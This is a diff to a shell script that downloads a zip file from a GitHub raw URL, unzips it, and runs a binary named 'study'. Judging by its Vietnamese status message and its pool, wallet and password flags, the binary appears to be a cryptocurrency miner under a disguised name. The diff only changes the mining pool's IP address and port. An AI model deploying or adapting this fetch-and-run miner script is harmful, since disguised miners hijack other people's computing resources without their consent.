@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./study -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./study -o 42.119.37.35:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
@@ -29,6 +29,6 @@ fi
 wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Study.zip
 unzip Study.zip
 rm config.json
-./study -o 42.119.101.40:4422 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./study -o 42.119.37.35:80 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
 exit 0
